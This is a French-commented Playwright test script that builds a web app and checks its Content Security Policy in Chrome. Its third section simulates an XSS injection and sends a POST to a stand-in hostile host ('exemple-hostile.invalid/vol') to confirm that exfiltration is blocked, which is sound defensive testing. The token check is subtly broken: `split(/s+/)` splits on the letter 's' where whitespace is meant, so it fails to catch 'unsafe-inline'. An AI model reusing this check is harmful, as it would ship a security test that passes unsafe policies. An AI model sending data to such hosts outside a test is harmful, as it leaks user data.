/**
 * LA POLITIQUE DE SÉCURITÉ DU CONTENU, ÉPROUVÉE DANS CHROME — ticket 5.2.
 *
 * 🔴 UNE CSP NON TESTÉE EST PIRE QU'AUCUNE CSP. Trop large, elle rassure sans
 * protéger. Trop stricte, elle casse une fonctionnalité — souvent une seule,
 * souvent celle qu'on n'ouvre pas tous les jours — et le jour où on s'en
 * aperçoit, le réflexe est de tout assouplir d'un coup.
 *
 * Ce banc vérifie les deux sens :
 *
 *   ① l'application MARCHE avec la politique posée
 *   ② et la politique REFUSE vraiment ce qu'elle prétend refuser
 *
 * ⚠️ LE SECOND CONTRÔLE EST LE PLUS IMPORTANT. Sans lui, une politique vide
 * passerait le premier sans rien protéger.
 *
 * Usage : node scripts/e2ee-csp.mjs   (backend :3000 et web :5173 démarrés)
 */

import { chromium } from "playwright";
import { execFileSync, spawn } from "node:child_process";

/*
 * 🔴 CE BANC CONSTRUIT ET SERT L'ARTEFACT LIVRÉ, il ne se branche pas sur le
 * serveur de développement — lequel n'a PAS de politique, parce que Vite y
 * injecte ses propres scripts en ligne pour le rechargement à chaud.
 *
 * ⚠️ ÉPROUVER LE SERVEUR DE DÉVELOPPEMENT NE PROUVERAIT RIEN : ce n'est pas
 * lui qui part en production.
 */
const PORT = 4173;
/**
 * ⚠️ LA RACINE ET LE PRÉFIXE SONT DEUX CHOSES. `vite preview` sert sous
 * `/webapp/` — c'est le préfixe de production. Interroger la racine nue pour
 * savoir si le serveur est debout donne un 404, et le banc conclut qu'il n'a
 * pas démarré alors qu'il tourne très bien.
 */
const RACINE = `http://localhost:${PORT}`;
const WEB = `${RACINE}/webapp`;
const API = process.env.API_URL ?? "http://localhost:3000";

let echecs = 0;

function verifie(libelle, condition, detail) {
  console.log(`  ${condition ? "\x1b[32m✓\x1b[0m" : "\x1b[31m✗\x1b[0m"} ${libelle}`);
  if (!condition) {
    echecs++;
    if (detail !== undefined) console.log(`      \x1b[31m${detail}\x1b[0m`);
  }
}

function titre(t) {
  console.log(`\n\x1b[1m${t}\x1b[0m`);
}

const EMAIL = "ecran@e2ee.test";
const MDP = "MotDePasseDeTest!2026";

async function main() {
  console.log("\n\x1b[1m════ LA POLITIQUE DE SÉCURITÉ DU CONTENU ════\x1b[0m");

  /*
   * ⚠️ ON CONSTRUIT PUIS ON SERT. `vite preview` sert le dossier `dist/` tel
   * qu'il partira en production — politique comprise. C'est le seul artefact
   * dont le test veuille dire quelque chose.
   */
  /*
   * 🐛 ON VÉRIFIE QUE L'API RÉPOND AVANT DE COMMENCER. Sans ce contrôle, un
   * backend arrêté faisait échouer « la connexion aboutit » — et le banc
   * l'imputait à `connect-src`, c'est-à-dire à la CSP. On cherchait un défaut de
   * politique là où il n'y avait qu'un serveur éteint.
   *
   * ⚠️ UN BANC QUI ATTRIBUE MAL UNE PANNE COÛTE PLUS QU'UN BANC ABSENT : il
   * envoie chercher au mauvais endroit, avec confiance.
   */
  try {
    const sonde = await fetch(`${API}/api/health`);
    if (!sonde.ok) throw new Error(String(sonde.status));
  } catch (e) {
    console.error(
      `
[31m💥 L'API ne répond pas sur ${API}[0m — démarrez le backend avant ce banc.
`,
    );
    process.exit(1);
  }

  console.log("⚙  Construction de l artefact...");
  execFileSync("npm", ["run", "build"], {
    stdio: ["ignore", "ignore", "inherit"],
    shell: true,
    /*
     * 🐛 ON NE FORCE PLUS LE PRÉFIXE À `/`. La construction l'acceptait, mais
     * `vite preview` relit `.env.production` de son côté et sert sous
     * `/webapp/` : les deux ne parlaient pas du même chemin, et le banc
     * tombait sur la page 404 de Vite — donc sans politique, donc « aucune
     * balise CSP ».
     *
     * ⚠️ ON GARDE LE PRÉFIXE DE PRODUCTION PARTOUT. Le remplacer aurait fait
     * passer le banc sur une configuration qui n'existe nulle part.
     */
    env: { ...process.env, VITE_API_BASE_URL: API },
  });

  const serveur = spawn("npx", ["vite", "preview", "--port", String(PORT), "--strictPort"], {
    stdio: "ignore",
    shell: true,
  });
  const arreter = () => { try { serveur.kill(); } catch { /* déjà arrêté */ } };
  process.on("exit", arreter);

  let debout = false;
  for (let n = 0; n < 60; n++) {
    try { if ((await fetch(`${WEB}/`)).ok) { debout = true; break; } } catch { /* pas encore */ }
    await new Promise((ok) => setTimeout(ok, 500));
  }
  if (!debout) {
    console.error("vite preview n a pas demarre.");
    arreter();
    process.exit(1);
  }


  const navigateur = await chromium
    .launch(
      process.env.CHROME_PATH
        ? { executablePath: process.env.CHROME_PATH }
        : { channel: "chrome" },
    )
    .catch(() => null);
  if (!navigateur) {
    console.error("\n\x1b[31m💥 Chrome introuvable.\x1b[0m\n");
    process.exit(1);
  }

  const page = await navigateur.newPage();

  /*
   * ⚠️ ON RAMASSE LES VIOLATIONS PAR L'ÉVÉNEMENT DU NAVIGATEUR, pas par la
   * console : Chrome écrit les refus de CSP dans la console sous une forme qui
   * change d'une version à l'autre. `securitypolicyviolation` est stable et
   * porte la directive exacte.
   */
  await page.addInitScript(() => {
    window.__violations = [];
    document.addEventListener("securitypolicyviolation", (e) => {
      window.__violations.push({
        directive: e.violatedDirective,
        bloque: e.blockedURI,
      });
    });
  });

  /* ── ① LA POLITIQUE EST BIEN POSÉE ───────────────────────────────── */
  titre("① La politique arrive dans la page");

  await page.goto(`${WEB}/login`, { waitUntil: "networkidle" });

  const politique = await page.evaluate(
    () =>
      document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content ?? "",
  );
  verifie("une politique est présente", politique.length > 0, "aucune balise CSP");

  /*
   * 🔴 LA LIGNE QUI EST LA FONCTIONNALITÉ. Tout le reste de la politique peut se
   * discuter ; `script-src` sans `'unsafe-inline'` est ce qui empêche un script
   * injecté de se servir des clés sur place.
   */
  /*
   * 🐛 CE CONTRÔLE RÉUSSISSAIT SUR UNE POLITIQUE VIDE. « ne contient pas
   * unsafe-inline » est vrai d'une chaîne vide : le banc annonçait donc une
   * protection là où il n'y avait RIEN, et c'est exactement ce qui s'est
   * produit quand la page servie était un 404.
   *
   * ⚠️ UN TEST QUI RÉUSSIT QUAND LA CHOSE EST ABSENTE est pire qu'un test
   * manquant : il rassure. On exige d'abord que la directive existe.
   */
  const scriptSrc = politique.match(/script-src ([^;]+)/)?.[1] ?? "";
  /*
   * 🐛 ET UNE SECONDE FOIS LE MÊME PIÈGE : `includes("unsafe-eval")` est VRAI
   * pour `'wasm-unsafe-eval'`, qui est pourtant l'inverse — la version étroite,
   * celle qui n'ouvre QUE WebAssembly. Le banc refusait donc la politique juste.
   *
   * ⚠️ ON COMPARE DES JETONS ENTIERS, pas des morceaux de chaîne. C'est la
   * troisième fois dans ce projet qu'une correspondance partielle attrape autre
   * chose que ce qu'elle visait.
   */
  const jetons = scriptSrc.trim().split(/s+/);
  verifie(
    "script-src existe ET refuse le code en ligne",
    jetons.length > 0 &&
      scriptSrc.length > 0 &&
      !jetons.includes("'unsafe-inline'") &&
      !jetons.includes("'unsafe-eval'"),
    scriptSrc.length === 0 ? "aucune directive script-src" : `script-src ${scriptSrc}`,
  );
  verifie(
    "et object-src est fermé",
    /object-src 'none'/.test(politique),
    politique,
  );

  /* ── ② L'APPLICATION MARCHE QUAND MÊME ───────────────────────────── */
  titre("② L'application fonctionne avec la politique posée");

  await page.locator("input").first().fill(EMAIL);
  await page.locator('input[type="password"]').first().fill(MDP);
  await page.getByRole("button", { name: /^Connexion$/i }).click();
  await page.waitForTimeout(9000);

  const portillon = page.locator(".pseudo-gate-champ");
  if (await portillon.isVisible().catch(() => false)) {
    await portillon.fill(`Csp ${Date.now().toString(36)}`);
    await page.locator(".pseudo-gate-valider").click();
    await page.waitForTimeout(3000);
  }

  verifie(
    "la connexion aboutit — donc `connect-src` laisse passer l'API",
    !page.url().includes("/login"),
    `resté sur ${page.url()}`,
  );

  await page.goto(`${WEB}/settings?section=security`, { waitUntil: "networkidle" });
  await page
    .locator(".sauv-serrure.on")
    .first()
    .waitFor({ state: "visible", timeout: 45_000 })
    .catch(() => {});

  verifie(
    "les réglages s'affichent — donc `style-src` laisse passer la mise en forme",
    await page.getByText("Sauvegarde chiffrée").first().isVisible().catch(() => false),
  );

  /*
   * ⚠️ LES POLICES SONT UN PIÈGE CLASSIQUE : elles viennent de DEUX domaines
   * distincts — `fonts.googleapis.com` pour la feuille de style,
   * `fonts.gstatic.com` pour les fichiers. En oublier un donne une application
   * qui marche mais dont la typographie change, ce que personne ne signale
   * comme un bogue de sécurité.
   */
  const violations = await page.evaluate(() => window.__violations ?? []);
  const gravesA = violations.filter(
    (v) => !/favicon|manifest/i.test(String(v.bloque)),
  );
  verifie(
    "aucune ressource légitime n'est bloquée",
    gravesA.length === 0,
    gravesA.map((v) => `${v.directive} → ${v.bloque}`).join(" | "),
  );

  /* ── ③ ET ELLE REFUSE VRAIMENT ───────────────────────────────────── */
  titre("③ La politique refuse ce qu'elle prétend refuser");

  /*
   * 🔴 SANS CE CONTRÔLE, UNE POLITIQUE VIDE PASSERAIT LES DEUX PREMIÈRES
   * SECTIONS. On injecte donc un script en ligne — exactement le geste d'une
   * faille XSS — et on vérifie qu'il ne s'exécute PAS.
   */
  const executeEnLigne = await page.evaluate(() => {
    window.__preuveXss = false;
    const s = document.createElement("script");
    s.textContent = "window.__preuveXss = true";
    document.head.appendChild(s);
    return window.__preuveXss;
  });
  verifie(
    "un script INJECTÉ EN LIGNE ne s'exécute pas",
    executeEnLigne === false,
    "un script injecté s'est exécuté — la CSP ne protège rien",
  );

  /*
   * ⚠️ ET L'EXFILTRATION VERS UN TIERS. C'est le second geste d'une attaque :
   * lire, puis envoyer ailleurs. `connect-src` doit le refuser.
   */
  const exfiltration = await page.evaluate(async () => {
    try {
      await fetch("https://exemple-hostile.invalid/vol", { method: "POST", body: "x" });
      return "passée";
    } catch (e) {
      return String(e?.name ?? e);
    }
  });
  verifie(
    "un envoi vers un domaine tiers est refusé",
    exfiltration !== "passée",
    "l'exfiltration a été autorisée",
  );

  const finales = await page.evaluate(() => window.__violations ?? []);
  const refus = finales.filter((v) => /script-src|connect-src/.test(v.directive));
  verifie(
    "et le navigateur l'a bien consigné comme violation",
    refus.length >= 2,
    JSON.stringify(finales),
  );
  refus.slice(0, 3).forEach((v) => console.log(`      \x1b[2m${v.directive} → ${v.bloque}\x1b[0m`));

  await navigateur.close();
  arreter();

  console.log(
    `\n\x1b[1m════ ${echecs === 0 ? "\x1b[32mTOUT EST VERT" : `\x1b[31m${echecs} ÉCHEC(S)`}\x1b[0m\x1b[1m ════\x1b[0m\n`,
  );
  process.exit(echecs === 0 ? 0 : 1);
}

main().catch((e) => {
  console.error("\n\x1b[31m💥 Le banc s'est arrêté :\x1b[0m", e.message);
  process.exit(1);
});
